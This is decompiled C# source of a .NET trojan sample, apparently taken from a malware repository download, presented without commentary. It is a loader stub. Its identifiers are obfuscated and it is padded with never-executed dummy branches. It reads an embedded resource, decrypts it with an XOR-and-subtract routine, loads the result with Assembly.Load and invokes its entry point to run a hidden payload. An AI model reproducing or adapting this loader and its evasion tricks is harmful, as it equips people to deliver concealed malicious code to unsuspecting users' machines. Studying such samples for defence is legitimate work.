// Decompiled with JetBrains decompiler
// Type: уаНзѤІчм
// Assembly: cn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B640E3C4-216F-4427-96BE-F9CA59C815FA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Generic-4d7a89a6c16c3f3e24e96a58c19a4246d98c78b6f2a7a424055ed6d418ee48cc.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;

[StandardModule]
internal sealed class уаНзѤІчм
{
  public static object КмПШтđЅьЕКб()
  {
    object obj;
    if (5 > 7)
    {
      bool flag = false;
      if ((char[]) null == null)
      {
        char[] chArray = new char[0];
      }
      string upper1;
      string upper2;
      if (flag)
      {
        string str1;
        upper1 = str1.ToUpper();
        string str2;
        upper2 = str2.ToUpper();
      }
      Dictionary<char, long> dictionary1 = new Dictionary<char, long>();
      int index1 = upper2.Length - 1;
      for (; index1 >= 0; --index1)
      {
        char key1 = upper2[index1];
        if (dictionary1.Count == 0 | !dictionary1.ContainsKey(key1))
        {
          dictionary1.Add(key1, 1L);
          Dictionary<char, long> dictionary2 = dictionary1;
          Dictionary<char, long> dictionary3 = dictionary2;
          char key2 = key1;
          int key3 = (int) key2;
          long num = dictionary2[key2] + 1L;
          dictionary3[(char) key3] = num;
        }
      }
      for (int index2 = upper1.Length - 1; index2 >= 0; --index2)
      {
        char key4 = upper1[index2];
        if (!dictionary1.ContainsKey(key4))
        {
          int num1 = (int) Interaction.MsgBox((object) "Complete");
        }
        Dictionary<char, long> dictionary4 = dictionary1;
        Dictionary<char, long> dictionary5 = dictionary4;
        char key5 = key4;
        int key6 = (int) key5;
        long num2 = dictionary4[key5] - 1L;
        dictionary5[(char) key6] = num2;
      }
    }
    else
    {
      byte[] numArray1 = (byte[]) НзийНдНыК.ҀҀПЧѺЮѰшЛг();
      byte[] numArray2 = (byte[]) уаНзѤІчм.ѢрѢäНДГИ();
      for (int index = numArray2.Length * 2 + numArray1.Length; index >= 0; index += -1)
        numArray2[index % numArray2.Length] = (byte) ((((int) numArray2[index % numArray2.Length] ^ (int) numArray1[index % numArray1.Length]) - (int) numArray2[(index + 1) % numArray2.Length] + 256) % 256);
      obj = (object) numArray2;
    }
    return obj;
  }

  public static object ЮмѪутНуđФ(Assembly a)
  {
    if (5 > 7)
    {
      if ((char[]) null == null)
      {
        char[] chArray = new char[0];
      }
      Dictionary<char, long> dictionary1 = new Dictionary<char, long>();
      string str1;
      int index1 = str1.Length - 1;
      for (; index1 >= 0; --index1)
      {
        char key1 = str1[index1];
        if (dictionary1.Count == 0 | !dictionary1.ContainsKey(key1))
        {
          dictionary1.Add(key1, 1L);
          Dictionary<char, long> dictionary2 = dictionary1;
          Dictionary<char, long> dictionary3 = dictionary2;
          char key2 = key1;
          int key3 = (int) key2;
          long num = dictionary2[key2] + 1L;
          dictionary3[(char) key3] = num;
        }
      }
      string str2;
      for (int index2 = str2.Length - 1; index2 >= 0; --index2)
      {
        char key4 = str2[index2];
        if (!dictionary1.ContainsKey(key4))
        {
          int num1 = (int) Interaction.MsgBox((object) "Complete");
        }
        Dictionary<char, long> dictionary4 = dictionary1;
        Dictionary<char, long> dictionary5 = dictionary4;
        char key5 = key4;
        int key6 = (int) key5;
        long num2 = dictionary4[key5] - 1L;
        dictionary5[(char) key6] = num2;
      }
    }
    else
      НзийНдНыК.тпзИсрПтюЕБЬ((MethodInfo) NewLateBinding.LateGet((object) a, (Type) null, "Entrypoint", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
    object obj;
    return obj;
  }

  private static object ѢрѢäНДГИ()
  {
    object assembly;
    if (5 > 7)
    {
      if ((char[]) null == null)
      {
        char[] chArray = new char[0];
      }
      Dictionary<char, long> dictionary1 = new Dictionary<char, long>();
      string str1;
      int index1 = str1.Length - 1;
      for (; index1 >= 0; --index1)
      {
        char key1 = str1[index1];
        if (dictionary1.Count == 0 | !dictionary1.ContainsKey(key1))
        {
          dictionary1.Add(key1, 1L);
          Dictionary<char, long> dictionary2 = dictionary1;
          Dictionary<char, long> dictionary3 = dictionary2;
          char key2 = key1;
          int key3 = (int) key2;
          long num = dictionary2[key2] + 1L;
          dictionary3[(char) key3] = num;
        }
      }
      string str2;
      for (int index2 = str2.Length - 1; index2 >= 0; --index2)
      {
        char key4 = str2[index2];
        if (!dictionary1.ContainsKey(key4))
        {
          int num1 = (int) Interaction.MsgBox((object) "Complete");
        }
        Dictionary<char, long> dictionary4 = dictionary1;
        Dictionary<char, long> dictionary5 = dictionary4;
        char key5 = key4;
        int key6 = (int) key5;
        long num2 = dictionary4[key5] - 1L;
        dictionary5[(char) key6] = num2;
      }
    }
    else
      assembly = (object) typeof (уаНзѤІчм).Assembly;
    return RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(НзийНдНыК.адзЕГЬЅнпѪЪѮ(RuntimeHelpers.GetObjectValue(assembly)), (Type) null, "GetObject", new object[1]
    {
      (object) "2"
    }, (string[]) null, (Type[]) null, (bool[]) null));
  }

  public static void ъблѴІхё()
  {
    object objectValue;
    if (5 > 7)
    {
      bool flag = false;
      if ((char[]) null == null)
      {
        char[] chArray = new char[0];
      }
      string upper1;
      string upper2;
      if (flag)
      {
        string str1;
        upper1 = str1.ToUpper();
        string str2;
        upper2 = str2.ToUpper();
      }
      Dictionary<char, long> dictionary1 = new Dictionary<char, long>();
      int index1 = upper2.Length - 1;
      for (; index1 >= 0; --index1)
      {
        char key1 = upper2[index1];
        if (dictionary1.Count == 0 | !dictionary1.ContainsKey(key1))
        {
          dictionary1.Add(key1, 1L);
          Dictionary<char, long> dictionary2 = dictionary1;
          Dictionary<char, long> dictionary3 = dictionary2;
          char key2 = key1;
          int key3 = (int) key2;
          long num = dictionary2[key2] + 1L;
          dictionary3[(char) key3] = num;
        }
      }
      for (int index2 = upper1.Length - 1; index2 >= 0; --index2)
      {
        char key4 = upper1[index2];
        if (!dictionary1.ContainsKey(key4))
        {
          int num1 = (int) Interaction.MsgBox((object) "Complete");
        }
        Dictionary<char, long> dictionary4 = dictionary1;
        Dictionary<char, long> dictionary5 = dictionary4;
        char key5 = key4;
        int key6 = (int) key5;
        long num2 = dictionary4[key5] - 1L;
        dictionary5[(char) key6] = num2;
      }
    }
    else
      objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object) null, typeof (Assembly), "Load", new object[1]
      {
        RuntimeHelpers.GetObjectValue(уаНзѤІчм.КмПШтđЅьЕКб())
      }, (string[]) null, (Type[]) null, (bool[]) null));
    RuntimeHelpers.GetObjectValue(уаНзѤІчм.ЮмѪутНуđФ((Assembly) objectValue));
  }

  [STAThread]
  public static void Main() => уаНзѤІчм.ъблѴІхё();
}
